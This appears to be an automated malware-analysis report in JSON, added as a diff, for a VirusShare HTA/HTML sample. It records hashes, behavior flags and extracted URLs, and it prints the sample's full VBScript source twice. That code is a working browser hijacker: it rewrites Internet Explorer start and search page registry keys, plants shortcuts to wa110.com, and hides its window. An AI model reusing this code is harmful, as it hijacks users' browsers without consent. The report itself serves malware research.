@@ -1,0 +1,82 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "<html><title></title><head>\n\n\n<object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>\n<script LANGUAGE=\"VBScript\">\non error resume next\n\nbugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\", \"http://www.wa110.com\"\nbugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\", \"http://www.wa110.com\"\nbugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page\", \"http://www.wa110.com\"\nbugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\default_page_url\", \"http://www.wa110.com\"\nbugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\First Home Page\",\"http://www.wa110.com\"\n\nCall LongFei_AddFavorites(\"\ufffd\u0538\ufffd\ufffd\ufffd\u016e\ufffd\ufffd\u037c\",\"http://www.wa110.com/\")\nCall LongFei_AddFavorites(\"\ufffd\ufffd\ufffd\ufffd\ufffd\u0530\ufffd\ufffd\ufffd\u04f0\",\"http://www.wa110.com/web/\")\nCall LongFei_AddDesktop(\"\ufffd\u0538\ufffd\ufffd\ufffd\u016e\ufffd\ufffd\u037c\",\"http://www.wa110.com/\")\nCall LongFei_AddDesktop(\"\ufffd\ufffd\ufffd\ufffd\ufffd\u0530\ufffd\ufffd\ufffd\u04f0\",\"http://www.wa110.com/web/\")\n\nFunction LongFei_AddFavorites(N, U)\n\ton error resume next\n\tSet S = bugs.CreateShortcut(bugs.SpecialFolders(\"Favorites\") + \"/\" + N +\".URL\")\n\tS.TargetPath = U\t\n\tS.Save()\n\tSet Sl = bugs.CreateShortcut(bugs.SpecialFolders(\"Favorites\") + \"/\ufffd\ufffd\ufffd\ufffd/\" + N +\".URL\")\n\tSl.TargetPath = U\n\tSl.Save()\nEnd Function\n\nFunction LongFei_AddDesktop(N, U)\n\ton error resume next\n\tSet S = bugs.CreateShortcut(bugs.SpecialFolders(\"AllUsersDesktop\") + \"/\" + N +\".URL\")\n\tS.TargetPath = U\t\n\tS.Save()\nEnd Function\n\n\nwindow.close\n</script>\n<script language=\"JavaScript\">\nfunction closeit() {\nsetTimeout(\"self.close()\",0)\n}\ncloseit()\nparent.moveTo((screen.width-0)/2,(screen.height-0)/2);\nparent.resizeTo(0,0);\n\n\n\n</script>\n</head>\n<HTA:APPLICATION   caption=\"no\" border=\"none\"\n                 SHOWINTASKBAR=\"no\">\n<body bgcolor=\"#ffffff\" text=\"#000000\" scroll=\"no\" leftmargin=\"2\"  topmargin=\"3\" marginwidth=\"0\" marginheight=\"0\" oncontextmenu='self.event.returnvalue=0' onkeydown=\"javascript:if(event.keyCode==27 || event.keyCode==78 && event.ctrlKey)return false;\">\n</body>\n</HTML>"
+    },
+    "filename": "VirusShare_46d1a5916d1f30ba681ed9dffd1fea0b",
+    "filesize": 2039,
+    "filetype": "HTML document, ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "46d1a5916d1f30ba681ed9dffd1fea0b",
+        "sha1": "64233d00bd096153e27e33479088db2114bab53b",
+        "sha256": "eb2bae747ce90cafa90ba996b05cf8ea3942b1c070dcb4f597090c77f78c584a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html><title></title><head>",
+            "<object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>",
+            "<script LANGUAGE=\"VBScript\">",
+            "on error resume next",
+            "bugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\", \"http://www.wa110.com\"",
+            "bugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\", \"http://www.wa110.com\"",
+            "bugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page\", \"http://www.wa110.com\"",
+            "bugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\default_page_url\", \"http://www.wa110.com\"",
+            "bugs.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\First Home Page\",\"http://www.wa110.com\"",
+            "Call LongFei_AddFavorites(\"\u0538\u016e\u037c\",\"http://www.wa110.com/\")",
+            "Call LongFei_AddFavorites(\"\u0530\u04f0\",\"http://www.wa110.com/web/\")",
+            "Call LongFei_AddDesktop(\"\u0538\u016e\u037c\",\"http://www.wa110.com/\")",
+            "Call LongFei_AddDesktop(\"\u0530\u04f0\",\"http://www.wa110.com/web/\")",
+            "Function LongFei_AddFavorites(N, U)",
+            "\ton error resume next",
+            "\tSet S = bugs.CreateShortcut(bugs.SpecialFolders(\"Favorites\") + \"/\" + N +\".URL\")",
+            "\tS.TargetPath = U\t",
+            "\tS.Save()",
+            "\tSet Sl = bugs.CreateShortcut(bugs.SpecialFolders(\"Favorites\") + \"//\" + N +\".URL\")",
+            "\tSl.TargetPath = U",
+            "\tSl.Save()",
+            "End Function",
+            "Function LongFei_AddDesktop(N, U)",
+            "\ton error resume next",
+            "\tSet S = bugs.CreateShortcut(bugs.SpecialFolders(\"AllUsersDesktop\") + \"/\" + N +\".URL\")",
+            "\tS.TargetPath = U\t",
+            "\tS.Save()",
+            "End Function",
+            "window.close",
+            "</script>",
+            "<script language=\"JavaScript\">",
+            "function closeit() {",
+            "setTimeout(\"self.close()\",0)",
+            "closeit()",
+            "parent.moveTo((screen.width-0)/2,(screen.height-0)/2);",
+            "parent.resizeTo(0,0);",
+            "</script>",
+            "</head>",
+            "<HTA:APPLICATION   caption=\"no\" border=\"none\"",
+            "                 SHOWINTASKBAR=\"no\">",
+            "<body bgcolor=\"#ffffff\" text=\"#000000\" scroll=\"no\" leftmargin=\"2\"  topmargin=\"3\" marginwidth=\"0\" marginheight=\"0\" oncontextmenu='self.event.returnvalue=0' onkeydown=\"javascript:if(event.keyCode==27 || event.keyCode==78 && event.ctrlKey)return false;\">",
+            "</body>",
+            "</HTML>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.wa110.com",
+            "http://www.wa110.com/web/",
+            "http://www.wa110.com/"
+        ]
+    },
+    "time": "0:00:00.287352",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
